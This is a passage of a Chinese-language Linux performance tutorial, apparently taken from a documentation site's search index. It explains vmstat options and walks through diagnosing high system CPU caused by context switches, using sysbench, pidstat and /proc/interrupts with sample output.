\u8bf4\u660e\uff1a\u4fe1\u606f\u662f\u4ece/proc/stat\u4e2d\u7684processes\u5b57\u6bb5\u91cc\u53d6\u5f97\u7684 $ vmstat -f 351164 forks","title":"vmstat -f"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/vmstat/#vmstat-s","text":"\u663e\u793a\u5185\u5b58\u76f8\u5173\u7edf\u8ba1\u4fe1\u606f\u53ca\u591a\u79cd\u7cfb\u7edf\u6d3b\u52a8\u6570\u91cf \u8bf4\u660e\uff1a\u8fd9\u4e9b\u4fe1\u606f\u7684\u5206\u522b\u6765\u81ea\u4e8e/proc/meminfo\uff0c/proc/stat\u548c/proc/vmstat [root@VM-0-16-centos ~]# vmstat -s 8008632 K total memory 332136 K used memory 889664 K active memory 473120 K inactive memory 6389112 K free memory 257024 K buffer memory 1030360 K swap cache 0 K total swap 0 K used swap 0 K free swap 1556482 non-nice user cpu ticks 669 nice user cpu ticks 2101154 system cpu ticks 2039287171 idle cpu ticks 108247 IO-wait cpu ticks 0 IRQ cpu ticks 846 softirq cpu ticks 0 stolen cpu ticks 4931445 pages paged in 21441536 pages paged out 0 pages swapped in 0 pages swapped out 3703040179 interrupts 2621374916 CPU context switches 1647854161 boot time 351175 forks [root@VM-0-16-centos ~]#","title":"vmstat -s"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/vmstat/#vmstat-d","text":"\u67e5\u770b\u78c1\u76d8\u7684\u8bfb\u5199 \u8bf4\u660e\uff1a\u8fd9\u4e9b\u4fe1\u606f\u4e3b\u8981\u6765\u81ea\u4e8e/proc/diskstats [root@VM-0-16-centos ~]# vmstat -d disk- ------------reads------------ ------------writes----------- -----IO------ total merged sectors ms total merged sectors ms cur sec vda 92280 820 9843254 345762 3037845 1006144 42883201 5918518 0 1830 vdb 387 0 18920 188 0 0 0 0 0 0 sr0 99 0 716 18 0 0 0 0 0 0 [root@VM-0-16-centos ~]#","title":"vmstat -d"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/vmstat/#vmstat-p-devvda1","text":"\u663e\u793a\u6307\u5b9a\u78c1\u76d8\u5206\u533a\u7edf\u8ba1\u4fe1\u606f \u8bf4\u660e\uff1a\u8fd9\u4e9b\u4fe1\u606f\u4e3b\u8981\u6765\u81ea\u4e8e/proc/diskstats. reads:\u6765\u81ea\u4e8e\u8fd9\u4e2a\u5206\u533a\u7684\u8bfb\u7684\u6b21\u6570\u3002 read sectors:\u6765\u81ea\u4e8e\u8fd9\u4e2a\u5206\u533a\u7684\u8bfb\u6247\u533a\u7684\u6b21\u6570\u3002 writes:\u6765\u81ea\u4e8e\u8fd9\u4e2a\u5206\u533a\u7684\u5199\u7684\u6b21\u6570\u3002 requested writes:\u6765\u81ea\u4e8e\u8fd9\u4e2a\u5206\u533a\u7684\u5199\u8bf7\u6c42\u6b21\u6570\u3002 [root@VM-0-16-centos ~]# vmstat -p /dev/vda1 vda1 reads read sectors writes requested writes 92247 9840886 3019912 42883513","title":"vmstat -p /dev/vda1"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/vmstat/#vmstat-m","text":"\u67e5\u770b\u7cfb\u7edf\u7684slab\u4fe1\u606f [root@VM-0-16-centos ~]# vmstat -m Cache Num Total Size Pages fuse_request 0 0 416 19 fuse_inode 0 0 768 21 isofs_inode_cache 50 50 640 25 mlx_compat_radix_tree_node 28 28 584 28 ext4_groupinfo_4k 420 420 136 30 ext4_inode_cache 32421 32432 1024 16 ext4_xattr 138 138 88 46 ext4_free_data 1024 1024 64 64 ext4_allocation_context 128 128 128 32 ...","title":"vmstat -m"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E5%AF%BC%E8%87%B4sys%E9%AB%98/","text":"\u9891\u7e41\u4e0a\u4e0b\u6587\u5207\u6362\u5bfc\u81f4sys\u9ad8 \u524d\u8a00 CPU \u4e0a\u4e0b\u6587\u5207\u6362\u662f\u4fdd\u8bc1 Linux \u7cfb\u7edf\u6b63\u5e38\u5de5\u4f5c\u7684\u4e00\u4e2a\u6838\u5fc3\u529f\u80fd\uff0c\u6309\u7167\u4e0d\u540c\u573a\u666f\uff0c\u53ef\u4ee5\u5206\u4e3a\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u5207\u6362\u3001\u7ebf\u7a0b\u4e0a\u4e0b\u6587\u5207\u6362\u548c\u4e2d\u65ad\u4e0a\u4e0b\u6587\u5207\u6362\u3002 vmstat \u662f\u4e00\u4e2a\u5e38\u7528\u7684\u7cfb\u7edf\u6027\u80fd\u5206\u6790\u5de5\u5177\uff0c\u4e3b\u8981\u7528\u6765\u5206\u6790\u7cfb\u7edf\u7684\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u4e5f\u5e38\u7528\u6765\u5206\u6790 CPU \u4e0a\u4e0b\u6587\u5207\u6362\u548c\u4e2d\u65ad\u7684\u6b21\u6570\u3002 \u6bd4\u5982\uff0c\u4e0b\u9762\u5c31\u662f\u4e00\u4e2a vmstat \u7684\u4f7f\u7528\u793a\u4f8b\uff1a # \u6bcf\u96945\u79d2\u8f93\u51fa1\u7ec4\u6570\u636e $ vmstat 5 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 0 7005360 91564 818900 0 0 0 0 25 33 0 0 100 0 0 \u6211\u4eec\u4e00\u8d77\u6765\u770b\u8fd9\u4e2a\u7ed3\u679c\uff0c\u4f60\u53ef\u4ee5\u5148\u8bd5\u7740\u81ea\u5df1\u89e3\u8bfb\u6bcf\u5217\u7684\u542b\u4e49\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u91cd\u70b9\u5f3a\u8c03\u4e0b\uff0c\u9700\u8981\u7279\u522b\u5173\u6ce8\u7684\u56db\u5217\u5185\u5bb9\uff1a cs\uff08context switch\uff09\u662f\u6bcf\u79d2\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u6b21\u6570\u3002 in\uff08interrupt\uff09\u5219\u662f\u6bcf\u79d2\u4e2d\u65ad\u7684\u6b21\u6570\u3002 r\uff08Running or Runnable\uff09\u662f\u5c31\u7eea\u961f\u5217\u7684\u957f\u5ea6\uff0c\u4e5f\u5c31\u662f\u6b63\u5728\u8fd0\u884c\u548c\u7b49\u5f85 CPU \u7684\u8fdb\u7a0b\u6570\u3002 b\uff08Blocked\uff09\u5219\u662f\u5904\u4e8e\u4e0d\u53ef\u4e2d\u65ad\u7761\u7720\u72b6\u6001\u7684\u8fdb\u7a0b\u6570\u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570 cs \u662f 33 \u6b21\uff0c\u800c\u7cfb\u7edf\u4e2d\u65ad\u6b21\u6570 in \u5219\u662f 25 \u6b21\uff0c\u800c\u5c31\u7eea\u961f\u5217\u957f\u5ea6 r \u548c\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u8fdb\u7a0b\u6570 b \u90fd\u662f 0\u3002 vmstat \u53ea\u7ed9\u51fa\u4e86\u7cfb\u7edf\u603b\u4f53\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u60c5\u51b5\uff0c\u8981\u60f3\u67e5\u770b\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u8be6\u7ec6\u60c5\u51b5\uff0c\u5c31\u9700\u8981\u4f7f\u7528\u6211\u4eec\u524d\u9762\u63d0\u5230\u8fc7\u7684 pidstat \u4e86\u3002\u7ed9\u5b83\u52a0\u4e0a -w \u9009\u9879\uff0c\u4f60\u5c31\u53ef\u4ee5\u67e5\u770b\u6bcf\u4e2a\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u60c5\u51b5\u4e86\u3002 \u6bd4\u5982\u8bf4\uff1a # \u6bcf\u96945\u79d2\u8f93\u51fa1\u7ec4\u6570\u636e $ pidstat -w 5 Linux 4.15.0 (ubuntu) 09/23/18 _x86_64_ (2 CPU) 08:18:26 UID PID cswch/s nvcswch/s Command 08:18:31 0 1 0.20 0.00 systemd 08:18:31 0 8 5.40 0.00 rcu_sched ... \u8fd9\u4e2a\u7ed3\u679c\u4e2d\u6709\u4e24\u5217\u5185\u5bb9\u662f\u91cd\u70b9\u5173\u6ce8\u5bf9\u8c61\u3002\u4e00\u4e2a\u662f cswch \uff0c\u8868\u793a\u6bcf\u79d2\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff08voluntary context switches\uff09\u7684\u6b21\u6570\uff0c\u53e6\u4e00\u4e2a\u5219\u662f nvcswch \uff0c\u8868\u793a\u6bcf\u79d2\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff08non voluntary context switches\uff09\u7684\u6b21\u6570\u3002 \u8fd9\u4e24\u4e2a\u6982\u5ff5\u4e00\u5b9a\u8981\u7262\u7262\u8bb0\u4f4f\uff0c\u56e0\u4e3a\u5b83\u4eec\u610f\u5473\u7740\u4e0d\u540c\u7684\u6027\u80fd\u95ee\u9898\uff1a \u6240\u8c13\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u662f\u6307\u8fdb\u7a0b\u65e0\u6cd5\u83b7\u53d6\u6240\u9700\u8d44\u6e90\uff0c\u5bfc\u81f4\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u3002\u6bd4\u5982\u8bf4\uff0c I/O\u3001\u5185\u5b58\u7b49\u7cfb\u7edf\u8d44\u6e90\u4e0d\u8db3\u65f6\uff0c\u5c31\u4f1a\u53d1\u751f\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u3002 \u800c\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u5219\u662f\u6307\u8fdb\u7a0b\u7531\u4e8e\u65f6\u95f4\u7247\u5df2\u5230\u7b49\u539f\u56e0\uff0c\u88ab\u7cfb\u7edf\u5f3a\u5236\u8c03\u5ea6\uff0c\u8fdb\u800c\u53d1\u751f\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u3002\u6bd4\u5982\u8bf4\uff0c\u5927\u91cf\u8fdb\u7a0b\u90fd\u5728\u4e89\u62a2 CPU \u65f6\uff0c\u5c31\u5bb9\u6613\u53d1\u751f\u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u3002 \u4f7f\u7528 sysbench \u6765\u6a21\u62df\u7cfb\u7edf\u591a\u7ebf\u7a0b\u8c03\u5ea6\u5207\u6362\u7684\u60c5\u51b5 \u673a\u5668\u914d\u7f6e\uff1a4 CPU\uff0c8GB \u5185\u5b58 \u9884\u5148\u5b89\u88c5 sysbench \u548c sysstat \u5305\uff0c yum install sysbench sysstat \u7ec8\u7aef1\uff1a # \u4ee510\u4e2a\u7ebf\u7a0b\u8fd0\u884c5\u5206\u949f\u7684\u57fa\u51c6\u6d4b\u8bd5\uff0c\u6a21\u62df\u591a\u7ebf\u7a0b\u5207\u6362\u7684\u95ee\u9898 [root@centos ~]# sysbench --threads=10 --max-time=300 threads run \u7ec8\u7aef2\uff1a [root@centos ~]# vmstat -wt 1 procs -----------------------memory---------------------- ---swap-- -----io---- -system-- --------cpu-------- -----timestamp----- r b swpd free buff cache si so bi bo in cs us sy id wa st CST 0 0 0 5903872 257528 1504408 0 0 0 12 1588 3094 0 0 100 0 0 2022-05-20 03:24:36 0 0 0 5903872 257528 1504408 0 0 0 0 1543 2985 0 0 100 0 0 2022-05-20 03:24:37 5 0 0 5902564 257528 1504408 0 0 0 0 15689 229995 6 12 82 0 0 2022-05-20 03:24:38 4 0 0 5902200 257528 1504408 0 0 0 0 39276 959684 35 57 8 0 0 2022-05-20 03:24:39 4 0 0 5902200 257528 1504408 0 0 0 0 40576 1106457 34 57 9 0 0 2022-05-20 03:24:40 4 0 0 5902200 257528 1504408 0 0 0 0 39332 1016539 35 57 9 0 0 2022-05-20 03:24:41 6 0 0 5902200 257528 1504408 0 0 0 12 40197 980060 35 56 9 0 0 2022-05-20 03:24:42 7 0 0 5902200 257528 1504408 0 0 0 0 39096 1054514 36 56 9 0 0 2022-05-20 03:24:43 6 0 0 5902200 257528 1504408 0 0 0 0 38769 1049458 35 57 9 0 0 2022-05-20 03:24:44 6 0 0 5902200 257528 1504408 0 0 0 0 34921 972992 36 56 8 0 0 2022-05-20 03:24:45 \u4f60\u5e94\u8be5\u53ef\u4ee5\u53d1\u73b0\uff0ccs \u5217\u7684\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570\u4ece\u4e4b\u524d\u7684 2000\u591a \u9aa4\u7136\u4e0a\u5347\u5230\u4e86 110 \u4e07\u3002 \u540c\u65f6\uff0c\u6ce8\u610f\u89c2\u5bdf\u5176\u4ed6\u51e0\u4e2a\u6307\u6807\uff1a r \u5217\uff1a\u5c31\u7eea\u961f\u5217\u7684\u957f\u5ea6\u5df2\u7ecf\u5230\u4e86 7\uff0c\u8fdc\u8fdc\u8d85\u8fc7\u4e86\u7cfb\u7edf CPU \u7684\u4e2a\u6570 4\uff0c\u6240\u4ee5\u80af\u5b9a\u4f1a\u6709\u5927\u91cf\u7684 CPU \u7ade\u4e89\u3002 us\uff08user\uff09\u548c sy\uff08system\uff09\u5217\uff1a\u8fd9\u4e24\u5217\u7684 CPU \u4f7f\u7528\u7387\u52a0\u8d77\u6765\u4e0a\u5347\u5230\u4e86 99%\uff0c\u5176\u4e2d\u7cfb\u7edf CPU \u4f7f\u7528\u7387\uff0c\u4e5f\u5c31\u662f sy \u5217\u9ad8\u8fbe 57%\uff0c\u8bf4\u660e CPU \u4e3b\u8981\u662f\u88ab\u5185\u6838\u5360\u7528\u4e86\u3002 in \u5217\uff1a\u4e2d\u65ad\u6b21\u6570\u4e5f\u4e0a\u5347\u5230\u4e86 4 \u4e07\u5de6\u53f3\uff0c\u8bf4\u660e\u4e2d\u65ad\u5904\u7406\u4e5f\u662f\u4e2a\u6f5c\u5728\u7684\u95ee\u9898\u3002\u7efc\u5408\u8fd9\u51e0\u4e2a\u6307\u6807\uff0c\u7cfb\u7edf\u7684\u5c31\u7eea\u961f\u5217\u8fc7\u957f\uff0c\u4e5f\u5c31\u662f\u6b63\u5728\u8fd0\u884c\u548c\u7b49\u5f85 CPU \u7684\u8fdb\u7a0b\u6570\u8fc7\u591a\uff0c\u5bfc\u81f4\u4e86\u5927\u91cf\u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u800c\u4e0a\u4e0b\u6587\u5207\u6362\u53c8\u5bfc\u81f4\u4e86\u7cfb\u7edf CPU \u7684\u5360\u7528\u7387\u5347\u9ad8\u3002\u90a3\u4e48\u5230\u5e95\u662f\u4ec0\u4e48\u8fdb\u7a0b\u5bfc\u81f4\u4e86\u8fd9\u4e9b\u95ee\u9898\u5462\uff1f \u7ec8\u7aef3\uff1a $ pidstat -w -u -t 1 Average: UID TGID TID %usr %system %guest %CPU CPU Command Average: 0 1188 - 0.30 0.60 0.00 0.90 - rshim Average: 0 - 1188 0.30 0.60 0.00 0.90 - |__rshim Average: 0 8916 - 0.20 0.30 0.00 0.50 - YDService Average: 0 - 8919 0.00 0.10 0.00 0.10 - |__YDService Average: 0 - 24019 0.10 0.00 0.00 0.10 - |__YDService Average: 0 8926 - 0.00 0.10 0.00 0.10 - YDLive Average: 0 28048 - 0.00 0.10 0.00 0.10 - kworker/3:1 Average: 0 - 28048 0.00 0.10 0.00 0.10 - |__kworker/3:1 Average: 0 28408 - 100.00 100.00 0.00 100.00 - sysbench Average: 0 - 28409 14.49 24.28 0.00 38.76 - |__sysbench Average: 0 - 28410 14.79 23.88 0.00 38.66 - |__sysbench Average: 0 - 28411 14.99 23.78 0.00 38.76 - |__sysbench Average: 0 - 28412 14.39 22.48 0.00 36.86 - |__sysbench Average: 0 - 28413 14.39 23.58 0.00 37.96 - |__sysbench Average: 0 - 28414 14.29 23.88 0.00 38.16 - |__sysbench Average: 0 - 28415 14.89 23.88 0.00 38.76 - |__sysbench Average: 0 - 28416 14.29 24.38 0.00 38.66 - |__sysbench Average: 0 - 28417 13.99 23.28 0.00 37.26 - |__sysbench Average: 0 - 28418 15.18 24.18 0.00 39.36 - |__sysbench Average: 0 28432 - 0.40 0.90 0.00 1.30 - pidstat Average: 0 - 28432 0.40 0.90 0.00 1.30 - |__pidstat Average: UID TGID TID cswch/s nvcswch/s Command Average: 0 6 - 4.70 0.00 ksoftirqd/0 Average: 0 - 6 4.70 0.00 |__ksoftirqd/0 Average: 0 9 - 15.08 0.00 rcu_sched Average: 0 - 9 15.08 0.00 |__rcu_sched Average: 0 - 28048 3.40 0.00 |__kworker/3:1 Average: 0 28184 - 0.10 0.00 bash Average: 0 - 28184 0.10 0.00 |__bash Average: 89 28341 - 0.10 0.00 pickup Average: 89 - 28341 0.10 0.00 |__pickup Average: 0 28405 - 0.50 0.00 kworker/3:0 Average: 0 - 28405 0.50 0.00 |__kworker/3:0 Average: 0 - 28409 25990.21 65447.15 |__sysbench Average: 0 - 28410 25781.02 66814.89 |__sysbench Average: 0 - 28411 25511.19 64601.10 |__sysbench Average: 0 - 28412 26991.11 62141.86 |__sysbench Average: 0 - 28413 26430.07 65891.11 |__sysbench Average: 0 - 28414 26558.14 64489.21 |__sysbench Average: 0 - 28415 26396.90 63810.69 |__sysbench Average: 0 - 28416 26074.23 63148.05 |__sysbench Average: 0 - 28417 26524.78 67813.79 |__sysbench Average: 0 - 28418 25621.38 69440.06 |__sysbench Average: 0 28432 - 1.00 0.90 pidstat Average: 0 - 28432 1.00 0.90 |__pidstat \u4ece pidstat \u7684\u8f93\u51fa\u4f60\u53ef\u4ee5\u53d1\u73b0\uff0cCPU \u4f7f\u7528\u7387\u7684\u5347\u9ad8\u679c\u7136\u662f sysbench \u5bfc\u81f4\u7684\uff0c\u5b83\u7684 CPU \u4f7f\u7528\u7387\u5df2\u7ecf\u8fbe\u5230\u4e86 100%\u3002\u4e0a\u4e0b\u6587\u5207\u6362\u7f6a\u9b41\u7978\u9996\uff0c\u8fd8\u662f\u8fc7\u591a\u7684 sysbench \u7ebf\u7a0b\u3002 \u7ec8\u7aef4\uff1a [root@VM-0-16-centos ~]# watch -n 1 -d cat /proc/interrupts Every 1.0s: cat /proc/interrupts Fri May 20 04:03:32 2022 CPU0 CPU1 CPU2 CPU3 0: 88 0 0 0 IO-APIC-edge timer 1: 10 0 0 0 IO-APIC-edge i8042 4: 387 0 0 0 IO-APIC-edge serial 6: 3 0 0 0 IO-APIC-edge floppy 8: 0 0 0 0 IO-APIC-edge rtc0 9: 0 0 0 0 IO-APIC-fasteoi acpi 11: 0 0 0 0 IO-APIC-fasteoi uhci_hcd:usb1, virtio3 12: 15 0 0 0 IO-APIC-edge i8042 14: 5016380 0 0 0 IO-APIC-edge ata_piix 15: 0 0 0 0 IO-APIC-edge ata_piix 24: 0 0 0 0 PCI-MSI-edge virtio1-config 25: 2810303 0 0 0 PCI-MSI-edge virtio1-req.0 26: 10 0 0 0 PCI-MSI-edge virtio0-config 27: 4356739 0 0 0 PCI-MSI-edge virtio0-input.0 28: 1 0 0 0 PCI-MSI-edge virtio0-output.0 29: 1 1136553 0 0 PCI-MSI-edge virtio0-input.1 30: 1 0 0 0 PCI-MSI-edge virtio0-output.1 31: 0 0 0 0 PCI-MSI-edge virtio2-config 32: 343 0 0 0 PCI-MSI-edge virtio2-req.0 NMI: 0 0 0 0 Non-maskable interrupts LOC: 1782951044 1786075743 1867019728 1796389760 Local timer interrupts SPU: 0 0 0 0 Spurious interrupts PMI: 0 0 0 0 Performance monitoring interrupts IWI: 1957371 1944591 1726299 1928079 IRQ work interrupts RTR: 0 0 0 0 APIC ICR read retries RES: 201178492 201387163 198141978 204827265 Rescheduling interrupts CAL: 157144 725105 2071436 2165417 Function call interrupts TLB: 2732341 2720775 2684270 2657260 TLB shootdowns TRM: 0 0 0 0 Thermal event interrupts THR: 0 0 0 0 Threshold APIC interrupts DFR: 0 0 0 0 Deferred Error APIC interrupts MCE: 0 0 0 0 Machine check exceptions MCP: 17122 17122 17122 17122 Machine check polls ERR: 0 MIS: 0 PIN: 0 0 0 0 Posted-interrupt notification event NPI: 0 0 0 0 Nested posted-interrupt event PIW: 0 0 0 0 Posted-interrupt wakeup event \u524d\u9762\u5728\u89c2\u5bdf\u7cfb\u7edf\u6307\u6807\u65f6\uff0c\u9664\u4e86\u4e0a\u4e0b\u6587\u5207\u6362\u9891\u7387\u9aa4\u7136\u5347\u9ad8\uff0c\u8fd8\u6709\u4e00\u4e2a\u6307\u6807\u4e5f\u6709\u5f88\u5927\u7684\u53d8\u5316\u3002\u662f\u7684\uff0c\u6b63\u662f\u4e2d\u65ad\u6b21\u6570\u3002\u4e2d\u65ad\u6b21\u6570\u4e5f\u4e0a\u5347\u5230\u4e86 4 \u4e07\uff0c\u4f46\u5230\u5e95\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u4e2d\u65ad\u4e0a\u5347\u4e86\u3002\u65e2\u7136\u662f\u4e2d\u65ad\uff0c\u5b83\u53ea\u53d1\u751f\u5728\u5185\u6838\u6001\uff0c\u800c pidstat \u53ea\u662f\u4e00\u4e2a\u8fdb\u7a0b\u7684\u6027\u80fd\u5206\u6790\u5de5\u5177\uff0c\u5e76\u4e0d\u63d0\u4f9b\u4efb\u4f55\u5173\u4e8e\u4e2d\u65ad\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u600e\u6837\u624d\u80fd\u77e5\u9053\u4e2d\u65ad\u53d1\u751f\u7684\u7c7b\u578b\u5462\uff1f\u90a3\u5c31\u662f\u4ece /proc/interrupts \u8fd9\u4e2a\u53ea\u8bfb\u6587\u4ef6\u4e2d\u8bfb\u53d6\u3002/proc \u5b9e\u9645\u4e0a\u662f Linux \u7684\u4e00\u4e2a\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff0c\u7528\u4e8e\u5185\u6838\u7a7a\u95f4\u4e0e\u7528\u6237\u7a7a\u95f4\u4e4b\u95f4\u7684\u901a\u4fe1\u3002/proc/interrupts \u5c31\u662f\u8fd9\u79cd\u901a\u4fe1\u673a\u5236\u7684\u4e00\u90e8\u5206\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u53ea\u8bfb\u7684\u4e2d\u65ad\u4f7f\u7528\u60c5\u51b5\u3002 \u89c2\u5bdf\u4e00\u6bb5\u65f6\u95f4\uff0c\u4f60\u53ef\u4ee5\u53d1\u73b0\uff0c\u53d8\u5316\u901f\u5ea6\u6700\u5feb\u7684\u662f\u91cd\u8c03\u5ea6\u4e2d\u65ad\uff08RES\uff09\uff0c\u8fd9\u4e2a\u4e2d\u65ad\u7c7b\u578b\u8868\u793a\uff0c\u5524\u9192\u7a7a\u95f2\u72b6\u6001\u7684 CPU \u6765\u8c03\u5ea6\u65b0\u7684\u4efb\u52a1\u8fd0\u884c\u3002\u8fd9\u662f\u591a\u5904\u7406\u5668\u7cfb\u7edf\uff08SMP\uff09\u4e2d\uff0c\u8c03\u5ea6\u5668\u7528\u6765\u5206\u6563\u4efb\u52a1\u5230\u4e0d\u540c CPU \u7684\u673a\u5236\uff0c\u901a\u5e38\u4e5f\u88ab\u79f0\u4e3a\u5904\u7406\u5668\u95f4\u4e2d\u65ad\uff08Inter-Processor Interrupts\uff0cIPI\uff09\u3002\u6240\u4ee5\uff0c\u8fd9\u91cc\u7684\u4e2d\u65ad\u5347\u9ad8\u8fd8\u662f\u56e0\u4e3a\u8fc7\u591a\u4efb\u52a1\u7684\u8c03\u5ea6\u95ee\u9898\uff0c\u8ddf\u524d\u9762\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570\u7684\u5206\u6790\u7ed3\u679c\u662f\u4e00\u81f4\u7684\u3002 \u7ec8\u7aef5\uff1a [root@VM-0-16-centos ~]# cat /proc/interrupts ; sleep 1s ;cat /proc/interrupts CPU0 CPU1 CPU2 CPU3 0: 88 0 0 0 IO-APIC-edge timer 1: 10 0 0 0 IO-APIC-edge i8042 4: 387 0 0 0 IO-APIC-edge serial 6: 3 0 0 0 IO-APIC-edge floppy 8: 0 0 0 0 IO-APIC-edge rtc0 9: 0 0 0 0 IO-APIC-fasteoi acpi 11: 0 0 0 0 IO-APIC-fasteoi uhci_hcd:usb1, virtio3 12: 15 0 0 0 IO-APIC-edge i8042 14: 5016252 0 0 0 IO-APIC-edge ata_piix 15: 0 0 0 0 IO-APIC-edge ata_piix 24: 0 0 0 0 PCI-MSI-edge virtio1-config 25: 2810206 0 0 0 PCI-MSI-edge virtio1-req.0 26: 10 0 0 0 PCI-MSI-edge virtio0-config 27: 4356352 0 0 0 PCI-MSI-edge virtio0-input.0 28: 1 0 0 0 PCI-MSI-edge virtio0-output.0 29: 1 1136531 0 0 PCI-MSI-edge virtio0-input.1 30: 1 0 0 0 PCI-MSI-edge virtio0-output.1 31: 0 0 0 0 PCI-MSI-edge virtio2-config 32: 343 0 0 0 PCI-MSI-edge virtio2-req.0 NMI: 0 0 0 0 Non-maskable interrupts LOC: 1782787996 1785909076 1866856961 1796226528 Local timer interrupts SPU: 0 0 0 0 Spurious interrupts PMI: 0 0 0 0 Performance monitoring interrupts IWI: 1957329 1944532 1726246 1928026 IRQ work interrupts RTR: 0 0 0 0 APIC ICR read retries RES: 199987693 200087749 197045111 203640135 Rescheduling interrupts CAL: 157140 725022 2071329 2165308 Function call interrupts TLB: 2732319 2720756 2684264 2657244 TLB shootdowns TRM: 0 0 0 0 Thermal event interrupts THR: 0 0 0 0 Threshold APIC interrupts DFR: 0 0 0 0 Deferred Error APIC interrupts MCE: 0 0 0 0 Machine check exceptions MCP: 17122 17122 17122 17122 Machine check polls ERR: 0 MIS: 0 PIN: 0 0 0 0 Posted-interrupt notification event NPI: 0 0 0 0 Nested posted-interrupt event PIW: 0 0 0 0 Posted-interrupt wakeup event CPU0 CPU1 CPU2 CPU3 0: 88 0 0 0 IO-APIC-edge timer 1: 10 0 0 0 IO-APIC-edge i8042 4: 387 0 0 0 IO-APIC-edge serial 6: 3 0 0 0 IO-APIC-edge floppy 8: 0 0 0 0 IO-APIC-edge rtc0 9: 0 0 0 0 IO-APIC-fasteoi acpi 11: 0 0 0 0 IO-APIC-fasteoi uhci_hcd:usb1, virtio3 12: 15 0 0 0 IO-APIC-edge i8042 14: 5016254 0 0 0 IO-APIC-edge ata_piix 15: 0 0 0 0 IO-APIC-edge ata_piix 24: 0 0 0 0 PCI-MSI-edge virtio1-config 25: 2810206 0 0 0 PCI-MSI-edge virtio1-req.0 26: 10 0 0 0 PCI-MSI-edge virtio0-config 27: 4356355 0 0 0 PCI-MSI-edge virtio0-input.0 28: 1 0 0 0 PCI-MSI-edge virtio0-output.0 29: 1 1136531 0 0 PCI-MSI-edge virtio0-input.1 30: 1 0 0 0 PCI-MSI-edge virtio0-output.1 31: 0 0 0 0 PCI-MSI-edge virtio2-config 32: 343 0 0 0 PCI-MSI-edge virtio2-req.0 NMI: 0 0 0 0 Non-maskable interrupts LOC: 1782789324 1785910399 1866858200 1796227706 Local timer interrupts SPU: 0 0 0 0 Spurious interrupts PMI: 0 0 0 0 Performance monitoring interrupts IWI: 1957329 1944533 1726247 1928026 IRQ work interrupts RTR: 0 0 0 0 APIC ICR read retries RES: 199997549 200099900 197051402 203648151 Rescheduling interrupts CAL: 157140 725022 2071329 2165308 Function call interrupts TLB: 2732319 2720756 2684264 2657244 TLB shootdowns TRM: 0 0 0 0 Thermal event interrupts THR: 0 0 0 0 Threshold APIC interrupts DFR: 0 0 0 0 Deferred Error APIC interrupts MCE: 0 0 0 0 Machine check exceptions MCP: 17122 17122 17122 17122 Machine check polls ERR: 0 MIS: 0 PIN: 0 0 0 0 Posted-interrupt notification event NPI: 0 0 0 0 Nested posted-interrupt event PIW: 0 0 0 0 Posted-interrupt wakeup event \u4ece1\u79d2\u949f\u7684\u6570\u91cf\u53d8\u5316\u6765\u8ba1\u7b97\uff0cRES\u57284\u4e2aCPU\u4e2d\u65ad\u6b21\u6570\u53d8\u5316\u5dee \u7684\u603b\u548c \u5dee\u4e0d\u591a\u662f 4W \u6240\u4ee5\uff0c\u8fd9\u91cc\u7684\u4e2d\u65ad\u5347\u9ad8\u8fd8\u662f\u56e0\u4e3a\u8fc7\u591a\u4efb\u52a1\u7684\u8c03\u5ea6\u95ee\u9898\uff0c\u8ddf\u524d\u9762\u4e0a\u4e0b\u6587\u5207\u6362\u6b21\u6570\u7684\u5206\u6790\u7ed3\u679c\u662f\u4e00\u81f4\u7684\u3002 \u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u53d8\u591a\u4e86\uff0c\u8bf4\u660e\u8fdb\u7a0b\u90fd\u5728\u7b49\u5f85\u8d44\u6e90\uff0c\u6709\u53ef\u80fd\u53d1\u751f\u4e86 I/O \u7b49\u5176\u4ed6\u95ee\u9898\uff1b \u975e\u81ea\u613f\u4e0a\u4e0b\u6587\u5207\u6362\u53d8\u591a\u4e86\uff0c\u8bf4\u660e\u8fdb\u7a0b\u90fd\u5728\u88ab\u5f3a\u5236\u8c03\u5ea6\uff0c\u4e5f\u5c31\u662f\u90fd\u5728\u4e89\u62a2 CPU\uff0c\u8bf4\u660e CPU \u7684\u786e\u6210\u4e86\u74f6\u9888\uff1b \u4e2d\u65ad\u6b21\u6570\u53d8\u591a\u4e86\uff0c\u8bf4\u660e CPU \u88ab\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5360\u7528\uff0c\u8fd8\u9700\u8981\u901a\u8fc7\u67e5\u770b /proc/interrupts 